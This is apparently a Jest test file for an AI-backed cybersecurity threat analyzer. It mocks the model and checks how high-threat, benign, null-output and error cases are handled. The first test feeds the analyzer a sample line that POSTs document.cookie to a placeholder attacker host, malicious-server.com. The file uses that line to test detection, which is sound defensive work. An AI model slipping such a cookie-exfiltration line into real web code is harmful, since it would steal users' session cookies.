
import { analyzeForThreats } from '../cybersecurity-threat-analyzer-flow';
import { ai } from '@/ai/genkit';
import type { CybersecurityThreatAnalyzerOutput } from '@/lib/schemas';

// Mock the AI module
jest.mock('@/ai/genkit', () => ({
  ai: {
    definePrompt: jest.fn(),
  },
}));

// A mock prompt function
const mockPrompt = jest.fn();

describe('Cybersecurity Threat Analyzer Flow', () => {
  beforeEach(() => {
    // Reset mocks before each test
    (ai.definePrompt as jest.Mock).mockReturnValue(mockPrompt);
    mockPrompt.mockClear();
  });

  it('should identify a high-level threat from a malicious code snippet', async () => {
    const mockApiResponse: CybersecurityThreatAnalyzerOutput = {
        threatLevel: 'High',
        summary: 'A suspicious script attempting to exfiltrate data was found.',
        recommendations: ['Do not run this script.', 'Block the originating IP address.'],
        indicatorsOfCompromise: [
            { type: 'URL', value: 'http://malicious-server.com/data', context: 'Potential data exfiltration endpoint.' },
        ],
    };
    mockPrompt.mockResolvedValue({ output: mockApiResponse });

    const input = {
      text: "fetch('http://malicious-server.com/data', { method: 'POST', body: document.cookie });",
    };

    const result = await analyzeForThreats(input);

    expect(ai.definePrompt).toHaveBeenCalled();
    expect(mockPrompt).toHaveBeenCalledWith(input);
    expect(result).toEqual(mockApiResponse);
    expect(result.threatLevel).toBe('High');
  });

  it('should identify no threat for a benign text', async () => {
    const mockApiResponse: CybersecurityThreatAnalyzerOutput = {
        threatLevel: 'None',
        summary: 'The text appears to be safe and contains no malicious indicators.',
        recommendations: ['No immediate action is required.'],
        indicatorsOfCompromise: [],
    };
    mockPrompt.mockResolvedValue({ output: mockApiResponse });

    const input = { text: 'Hello, world!' };
    const result = await analyzeForThreats(input);
    
    expect(mockPrompt).toHaveBeenCalledWith(input);
    expect(result).toEqual(mockApiResponse);
    expect(result.threatLevel).toBe('None');
  });

  it('should throw an error if the AI provides no output', async () => {
    mockPrompt.mockResolvedValue({ output: null });

    const input = { text: 'This will result in null output' };
    await expect(analyzeForThreats(input)).rejects.toThrow("The AI failed to analyze the text for threats. Please try again.");
  });

  it('should propagate errors from the AI prompt function', async () => {
    const errorMessage = 'AI model service unavailable';
    mockPrompt.mockRejectedValue(new Error(errorMessage));

    const input = { text: 'This input causes a failure' };

    await expect(analyzeForThreats(input)).rejects.toThrow(errorMessage);
  });
});
